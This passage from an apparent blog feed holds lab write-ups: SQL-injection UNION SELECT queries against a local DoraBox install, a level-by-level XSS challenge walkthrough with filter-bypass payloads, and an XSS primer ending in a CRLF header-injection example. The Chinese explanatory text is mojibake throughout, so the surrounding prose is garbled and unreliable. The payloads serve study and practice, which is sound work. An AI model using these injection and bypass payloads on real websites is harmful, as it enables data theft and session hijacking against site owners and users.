·å¾ˆç¹çï¼Œå¦‚ä½•èƒ½å¤Ÿè®©ä¸€ä¸‹å­å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥å‘¢ï¼Œç”¨åˆ°äº†<code>group_cancat()</code>å‡½æ•°ï¼š</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679337786295.jpg" srcset="/img/loading.gif" alt="-w1028"></p><p>ç„¶åæˆ‘ä»¬ç»§ç»­å»æŸ¥åˆ—åï¼Œç„¶åè½¬åˆ°<code>infromation_schema</code>çš„<code>columns</code>ä¸‹ï¼Œä¸€ç›´æœç´¢<code>account</code>ä¸‹æ»‘å‘ç°ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªåˆ—è¡¨ä¸‹å¯ä»¥æ‹¿åˆ°æ›´å…¨çš„ä¿¡æ¯ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679344981875.jpg" srcset="/img/loading.gif" alt="-w1162"></p><p>å»å¯¹æ¯”ä¸‹<code>account</code>è¡¨ä¸‹çš„åˆ—åä¿¡æ¯ï¼š<br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679342199859.jpg" srcset="/img/loading.gif" alt="-w189"><br>æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´æ”¹ä¸‹è¯­å¥ï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679346900575.jpg" srcset="/img/loading.gif" alt="-w1012"><br>å‘ç°æˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°è¿™ä¸ªè¡¨åï¼Œå¯¹æ¯”æ•°æ®åº“æˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‰ç…§è¡¨åå‡ºç°çš„ä¸ªæ•°çœ‹å‡ºå…¶è¡¨ä¸‹æœ‰å¤šå°‘åˆ—ã€‚ç„¶åæˆ‘ä»¬æ‹¿<code>news</code>æµ‹è¯•ä¸‹è·å–åˆ—åï¼š<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQLåŸºç¡€å­¦ä¹ /images/15679349902804.jpg" srcset="/img/loading.gif" alt="-w1049"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSæŒ‘æˆ˜ä¹‹æ—…</title>
    <link href="/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <url>/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="XSSæŒ‘æˆ˜ä¹‹æ—…"><a href="#XSSæŒ‘æˆ˜ä¹‹æ—…" class="headerlink" title="XSSæŒ‘æˆ˜ä¹‹æ—…"></a>XSSæŒ‘æˆ˜ä¹‹æ—…</h1><h2 id="å…³å¡"><a href="#å…³å¡" class="headerlink" title="å…³å¡"></a>å…³å¡</h2><h3 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h3><p>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668211760590.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ­¤é¢˜æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ„é€ è¯­å¥ï¼Œåœ¨æ ‡ç­¾ä¹‹é—´è¿›è¡Œè¾“å‡ºã€‚</p><h3 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668215829302.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ­¤é¢˜å˜æˆäº†<code>&lt;input&gt;</code>æ ‡ç­¾ï¼Œçœ‹åˆ°æ­¤å¤„åå¯ä»¥è€ƒè™‘ï¼Œæå‰é—­åˆæ‰è¿™ä¸ªæ ‡ç­¾ï¼Œæ‰€ä»¥æ„é€ payloadï¼š<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œ<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221905952.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>æˆ–è€…ä¹Ÿå¯ä»¥payloadï¼š<code>&quot; onclick=alert(1)&gt;</code>è¿™ä¸ªéœ€è¦ç‚¹å‡»æœç´¢åï¼Œå†ç‚¹å‡»æœç´¢æ¡†ï¼Œå±äºå€ŸåŠ©jsäº‹ä»¶ç±»å‹ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221627239.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668225398647.jpg?raw=true" srcset="/img/loading.gif" alt><br>å˜æˆäº†å•å¼•å·çš„inputæ ‡ç­¾ï¼Œå…ˆå°è¯•é—­åˆinputæ ‡ç­¾è¿™ä¸ªæ€è·¯ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227235348.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°æ²¡æœ‰è¿‡å»ï¼Œå»çœ‹ä¸‹ç½‘é¡µä»£ç ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227746468.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°å…¶è¿‡æ»¤äº†<code>&lt; &gt;</code>,è¿™æ ·åªèƒ½é€šè¿‡jsäº‹ä»¶æ¥æ„é€ å¼¹çª—ã€‚<br>è·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œä¸è¿‡æ­¤å¤„æ˜¯å•å¼•å·ï¼Œæ‰€ä»¥æ„é€ payloadï¼š<br><code>&#39; onclick=&#39;alert(1)</code><br>æ³¨æ„æ­¤å¤„çš„<code>alert(1)</code>çš„å‰é¢è¿˜æœ‰ä¸ªå•å¼•å·ï¼Œå…¶æ•ˆæœå°±æ˜¯<code>value=&#39;&#39; onclick=&#39;alert(1)&#39;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668232441274.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669039155180.jpg?raw=true" srcset="/img/loading.gif" alt><br>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œè¿˜æ˜¯è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œä¸è¿‡æ˜¯å•å¼•å·æ¢æˆäº†åŒå¼•å·ã€‚æŒ‰ç…§åŸæ¥çš„æ€è·¯ï¼Œæ„é€ payloadï¼š<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669038872074.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h3><p>çœ‹ç½‘é¡µæºä»£ç ï¼Œè·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œç›´æ¥å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669042011764.jpg?raw=true" srcset="/img/loading.gif" alt><br><code>&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;</code>å†æ¬¡æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºå¯¹onè¿›è¡Œäº†è¿‡æ»¤ï¼Œåœ¨å°è¯•åŒå†™ã€æ”¹å˜å¤§å°å†™æ— æœåã€‚æ¢æ€è·¯çœ‹çœ‹<code>&lt; &gt;</code>æ˜¯å¦è¿‡æ»¤ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤ã€‚ç„¶åè€ƒè™‘å…ˆé—­åˆinputæ ‡ç­¾ï¼Œç„¶åæ„é€ ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»åè°ƒç”¨jsäº‹ä»¶ã€‚<br>payload=<code>&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br>ç„¶åç‚¹å‡»å°±okäº†ã€‚</p><h3 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h3><p>ç¬¬å…­å…³ç›´æ¥æµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åçœ‹ç½‘é¡µæºä»£ç ï¼š<br><code>&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;</code><br>å‘ç°hrefé­åˆ°äº†è¿‡æ»¤ï¼Œç»“æœå‘ç°æ”¹å˜å¤§å°å†™å¯ä»¥ç»•è¿‡ã€‚<br>payloadï¼š<code>&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669054032946.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h3><p>è¿˜æ˜¯å…ˆæµ‹è¯•ä¸Šé¢˜çš„payloadï¼Œç„¶åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ï¼š<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669056409336.jpg?raw=true" srcset="/img/loading.gif" alt><br>hrefä¸scriptç›´æ¥è¢«æ›¿æ¢æˆäº†ç©ºï¼Œç„¶åè€ƒè™‘åŒå†™ç»•è¿‡ï¼Œæ„é€ payloadï¼š<code>&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669055755331.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060160351.jpg?raw=true" srcset="/img/loading.gif" alt><br>å‘ç°æœ‰äº›ä¸ä¸€æ ·äº†ï¼Œç„¶åå…ˆç‚¹ä¸‹â€æ·»åŠ å‹æƒ…é“¾æ¥â€œæŒ‰é’®ï¼Œå»çœ‹ä¸‹ç½‘é¡µæºä»£ç ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060975749.jpg?raw=true" srcset="/img/loading.gif" alt><br>ä¼šå‘ç°è¿™ä¸ªé¢˜æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹æ¥è¿›è¡Œxssæ”»å‡»ã€‚å…ˆæ„é€ payloadï¼š<code>javascript:alert(1)</code>ï¼Œæ— æ³•é€šè¿‡ï¼Œç„¶åæŸ¥çœ‹æºä»£ç <code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code>å¯ä»¥å‘ç°å…¶è¿‡æ»¤äº†å­—ç¬¦ä¸²scriptï¼Œå› ä¸ºæ­¤å¤„ä¸ºhtmlæ ‡è®°è¯­è¨€ï¼Œè€ƒè™‘æŠŠâ€râ€è½¬æ¢ä¸ºHTMLå®ä½“æ¥ç»•è¿‡ã€‚<br>æ„é€ payloadï¼š<code>javasc&amp;#114;ipt:alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669059745275.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669066979885.jpg?raw=true" srcset="/img/loading.gif" alt><br>è¿™é¢˜è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€ä¸ªç±»å‹ï¼Œä½†æ˜¯å‘ç°ä¸ç®¡åŠ å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤ºè¿™ä¸ªã€‚ä¸å¦‚åŠ å…¥ä¸ªæ­£å¸¸åˆæ³•é“¾æ¥è¯•ä¸€è¯•ï¼Œ<code>http://www.baidu.com</code>,å‘ç°æ˜¾ç¤ºæ­£å¸¸äº†ï¼Œç»è¿‡æµ‹è¯•åå‘ç°å…¶åœ¨æ£€æµ‹åˆ°<code>http://</code>åæ‰ä¼šæ­£å¸¸æ˜¾ç¤ºä½ çš„ä»£ç ã€‚æ‰€ä»¥æ„é€ payloadï¼š<code>javasc&amp;#114;ipt:alert(1)//http://</code><br>æ³¨æ„â€//â€œè¿™ä¸ªæ˜¯æ¥æ³¨é‡Šåé¢çš„ä»£ç çš„ã€‚<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669068046610.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669071677201.jpg?raw=true" srcset="/img/loading.gif" alt><br>è¿›æ¥ä»¥åå‘ç°æ— ä»»ä½•å¯è¾“å…¥çš„åœ°æ–¹ï¼Œç„¶åå°±æŸ¥çœ‹æºä»£ç <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669072118291.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>å‘ç°å…¶typeç±»å‹å…¨æ˜¯hiddenï¼Œç„¶åè€ƒè™‘æ˜¯ä¸æ˜¯è€ƒå¯Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œåœ¨æŸ¥è¯¢åå‘ç°å¤§å¤šè§£å†³åŠæ³•å°±æ˜¯æŠŠhiddenï¼Œæ”¹ä¸ºtextç±»å‹ã€‚å› ä¸ºåœ¨æµè§ˆå™¨getåˆ°<code>type=â€***â€œ</code>ï¼Œå³å¯æŠŠåŸæ¥çš„typeç»™æ›¿æ¢æ‰€ä»¥è€ƒè™‘æ„é€ payloadï¼š<br><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br>ç„¶åä¼šå‡ºç°ä¸ªè¾“å…¥æ¡†ï¼Œç‚¹å‡»åå³å¯è¿‡å…³ã€‚<strong>æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯æŸ¥çœ‹æºä»£ç åå‘ç°æœ‰ä¸‰ä¸ªinputæ ‡ç­¾ï¼Œä½†å®é™…æµ‹è¯•åªæœ‰æœ€åä¸€ä¸ª<code>name=&quot;t_sort&quot;</code>æ‰ä¼šå‡ºç°æ–‡æœ¬æ¡†ï¼Œæ‰€ä»¥æ„é€ äº†ä»¥æœ€åä¸€ä¸ªæ ‡ç­¾ä¸ºæ”»å‡»ç‚¹çš„payloadã€‚</strong><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669081314821.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669077403237.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³"></a>ç¬¬åä¸€å…³è‡³ç¬¬åä¸‰å…³</h3><p>è¿™å‡ å…³éƒ½æ˜¯httpå¤´æ³¨å…¥éœ€è¦æŠ“åŒ…æ¥å®Œæˆï¼ŒåŸºæœ¬å¤§å·®ä¸å·®çš„ã€‚<br>ç¬¬åä¸€å…³ Referer<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669099835862.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669091402139.jpg?raw=true" srcset="/img/loading.gif" alt><br>ç¬¬åäºŒå…³ ua<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669102310614.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101896563.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101286592.jpg?raw=true" srcset="/img/loading.gif" alt><br>ç¬¬åä¸‰å…³ cookie<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103883723.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103999546.jpg?raw=true" srcset="/img/loading.gif" alt><br>æ˜æ˜¾æ˜¯cookieæ³¨å…¥äº†<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669104596197.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="ç¬¬åå››è‡³æœ€å"><a href="#ç¬¬åå››è‡³æœ€å" class="headerlink" title="ç¬¬åå››è‡³æœ€å"></a>ç¬¬åå››è‡³æœ€å</h3><p>è¿™å‡ é“é¢˜åŸºæœ¬éƒ½æ˜¯çœ‹ç€åˆ«äººçš„åšå®¢æ‰åšçš„ä¸‹æ¥ï¼Œå¹¶ä¸”åšäº†æ„Ÿè§‰ä¸æ˜¯å¤ªæ˜ç™½åŸç†ï¼Œå°±å…ˆä¸æ€»ç»“äº†ã€‚ä»¥åå­¦åˆ°æ›´æ·±çš„å†è¿›è¡Œæ€»ç»“ã€‚</p><h2 id="ç»•è¿‡å§¿åŠ¿å°è¡¥å……"><a href="#ç»•è¿‡å§¿åŠ¿å°è¡¥å……" class="headerlink" title="ç»•è¿‡å§¿åŠ¿å°è¡¥å……"></a>ç»•è¿‡å§¿åŠ¿å°è¡¥å……</h2><h3 id="â€œ-â€è¢«è¿‡æ»¤"><a href="#â€œ-â€è¢«è¿‡æ»¤" class="headerlink" title="â€œ()â€è¢«è¿‡æ»¤"></a>â€œ()â€è¢«è¿‡æ»¤</h3><p>ç”¨â€ ` â€œ å­—ç¬¦äº†æ¥ä»£æ›¿æ‹¬å·ã€‚</p><p>payload: alert`1`</p><h4 id="å°è¿›é˜¶-â€œ-â€œ-â€œ-â€åŒæ—¶è¢«è¿‡æ»¤"><a href="#å°è¿›é˜¶-â€œ-â€œ-â€œ-â€åŒæ—¶è¢«è¿‡æ»¤" class="headerlink" title="å°è¿›é˜¶ â€œ ` â€œ â€œ()â€åŒæ—¶è¢«è¿‡æ»¤"></a>å°è¿›é˜¶ â€œ ` â€œ â€œ()â€åŒæ—¶è¢«è¿‡æ»¤</h4><p>å¯ä»¥ä½¿ç”¨ <code>&lt;svg&gt;</code> æ ‡ç­¾ï¼Œå…¶æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å¯ä»¥æ‰§è¡ŒHTMLå®ä½“ä»£ç ã€‚ç”¨æ³•æ˜¯<code>&lt;svg&gt;&amp;#æ•°å­—;</code><br>æ‰€ä»¥æ„é€ payload:<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSSçŸ¥è¯†ç®€å•å­¦ä¹ </title>
    <link href="/2019/08/16/xss%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/08/16/xss%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSSçŸ¥è¯†ç®€å•å­¦ä¹ "><a href="#XSSçŸ¥è¯†ç®€å•å­¦ä¹ " class="headerlink" title="XSSçŸ¥è¯†ç®€å•å­¦ä¹ "></a>XSSçŸ¥è¯†ç®€å•å­¦ä¹ </h1><h2 id="ä¸€-Xssç®€ä»‹"><a href="#ä¸€-Xssç®€ä»‹" class="headerlink" title="ä¸€:Xssç®€ä»‹"></a>ä¸€:Xssç®€ä»‹</h2><p>XSSæ”»å‡»å…¨ç§°<strong>è·¨ç«™è„šæœ¬æ”»å‡»</strong>ï¼Œæ˜¯ä¸ºä¸å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheets, CSS)çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸ºXSSï¼ŒXSSæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€œï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚</p><h2 id="äºŒï¼šajaxç®€ä»‹"><a href="#äºŒï¼šajaxç®€ä»‹" class="headerlink" title="äºŒï¼šajaxç®€ä»‹"></a>äºŒï¼šajaxç®€ä»‹</h2><p>ajaxå…¶å®å°±æ˜¯å¼‚æ­¥JavaScriptå’Œxmlï¼Œå…¶æœ€å¤§ä¼˜åŠ¿åœ¨äºå¯ä»¥å®ç°å¼‚æ­¥è®¿é—®ã€‚<br>ä¸ºä»€ä¹ˆè¦ç”¨AJAXï¼Œé¦–å…ˆå®ƒå¤Ÿéšç§˜ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œæ— åˆ·æ–°â€ï¼Œå…¶æ¬¡ï¼Œå®ƒèƒ½æ›´æœ‰æ•ˆåœ°è¿…é€Ÿå¤„ç†å„ç§å¤æ‚å¤šå˜çš„æ•°æ®ã€‚å…¶å¯ä»¥å®ç°å¼‚æ­¥æ›´æ–°å’Œè·¨åŸŸã€‚</p><h2 id="ä¸‰ï¼šxssæ¼æ´åˆ†ç±»"><a href="#ä¸‰ï¼šxssæ¼æ´åˆ†ç±»" class="headerlink" title="ä¸‰ï¼šxssæ¼æ´åˆ†ç±»"></a>ä¸‰ï¼šxssæ¼æ´åˆ†ç±»</h2><h3 id="å­˜å‚¨XSS"><a href="#å­˜å‚¨XSS" class="headerlink" title="å­˜å‚¨XSS"></a>å­˜å‚¨XSS</h3><p>å­˜å‚¨XSS,ä¼šæŠŠæ”»å‡»è€…çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ”»å‡»è¡Œä¸ºå°†ä¼´éšç€æ”»å‡»æ•°æ®ä¸€ç›´å­˜åœ¨ã€‚ä¹Ÿå°±æ˜¯æäº¤JSæ”»å‡»ä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ç„¶åå†è¾“å‡ºã€‚</p><p>ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹æœ€å®¹æ˜“æ»‹ç”ŸXSSï¼Œè­¬å¦‚ç•™è¨€ã€è¯„è®ºç­‰è¡¨å•ï¼Œä¸€ä¸ªçš„ç•™è¨€æœ¬ï¼Œå› ä¸ºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä½œå‡ºåˆé€‚çš„è¿‡æ»¤ï¼Œå¯¼è‡´ä¸€ä¸ªXSSçš„äº§ç”Ÿã€‚ç•™è¨€ç‡å…ˆä¼ é€’ç»™ç®¡ç†å‘˜ï¼Œå½“ä½œjavascriptåŠ«æŒï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç®¡ç†å‘˜çš„æƒé™åšä»»ä½•äº‹æƒ…ã€‚å½“å†…å®¹é€šè¿‡å®¡æ ¸ï¼Œå‘å¸ƒåˆ°ç½‘ç«™ï¼Œæ­¤æ—¶æ‰€æœ‰çš„webæµè§ˆç”¨æˆ·éƒ½æœ‰å¯èƒ½å—åˆ°XSSï¼Œæˆ‘ä»¬èƒ½è·å¾—æ›´å¤šçš„ä¼šè¯åŠ«æŒã€‚ </p><h3 id="åå°„å‹XSSæ”»å‡»"><a href="#åå°„å‹XSSæ”»å‡»" class="headerlink" title="åå°„å‹XSSæ”»å‡»"></a>åå°„å‹XSSæ”»å‡»</h3><p>åå°„å‹XSSæ”»å‡»ä¹Ÿæ˜¯éæŒä¹…å‹XSSæ”»å‡»ï¼Œå…¶æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä»…å¯¹å½“æ¬¡çš„é¡µé¢è®¿é—®äº§ç”Ÿå½±å“ã€‚éæŒä¹…å‹XSSæ”»å‡»è¦æ±‚ç”¨æˆ·è®¿é—®ä¸€ä¸ªè¢«æ”»å‡»è€…ç¯¡æ”¹åçš„é“¾æ¥ï¼Œç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œè¢«æ¤å…¥çš„æ”»å‡»è„šæœ¬è¢«ç”¨æˆ·æ¸¸è§ˆå™¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œå…¶æ˜¯ç»è¿‡æœåŠ¡å™¨çš„ã€‚</p><p>å…¶éœ€è¦é»‘å®¢è¿›è¡Œè¯±éª—ä½¿ç”¨æˆ·è®¿é—®è¿™ä¸ªå¸¦æœ‰xssæ”»å‡»çš„é“¾æ¥åï¼Œä¾¿è¢«JavaScriptåŠ«æŒï¼Œæ”¶åˆ°æ”»å‡»ã€‚</p><h3 id="Dom-xss"><a href="#Dom-xss" class="headerlink" title="Dom-xss"></a>Dom-xss</h3><p>é€šè¿‡URLä¼ å…¥å‚æ•°æ‰€è§¦å‘ï¼Œ<strong>å…¶ä¸ä¸æœåŠ¡å™¨è¿›è¡Œé€šä¿¡</strong>ï¼Œä½†æ˜¯æˆ‘ä»¬çš„jsæ”»å‡»ä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œè¿™æ˜¯éœ€è¦åˆ†æé¡µé¢æºç ç„¶åè¿›è¡Œåˆ©ç”¨ï¼Œæ˜¯å­˜åœ¨å®¢æˆ·ç«¯é¡µé¢çš„è„šæœ¬è‡ªèº«ä¸­ã€‚</p><h2 id="å››ï¼šX-XSS-Protection"><a href="#å››ï¼šX-XSS-Protection" class="headerlink" title="å››ï¼šX-XSS-Protection"></a>å››ï¼šX-XSS-Protection</h2><p>æ˜¯æµè§ˆå™¨å¯¹xxsé˜²æŠ¤çš„ä¸€ä¸ªç­–ç•¥ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡æŠ“åŒ…è½¯ä»¶ï¼Œä¿®æ”¹å¤´æ¥è¿›è¡Œç»•è¿‡ã€‚<br>ç­’å˜ä¸€å¥æ´»:<br>`header(â€œX-XSS-Protection: 0â€);å‘Šæ³æµè§ˆå™¨ç¦ç”¨XSSä¿æ¦<br>header(â€œX-XSS-Protection: 1â€);å‘Šæ³æµè§ˆå™¨å¹µå®•XSSä¿æ¦`</p><h2 id="äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥"><a href="#äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥" class="headerlink" title="äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥"></a>äº”ï¼šCRLFå“åº”å¤´æ³¨å…¥</h2><p><code>Location: http://****%0d%0aX-XSS-Protection: 0</code><br>å°±æ˜¯ç›¸å½“äº<br>`Location: http://****<br>XSS-Protection: 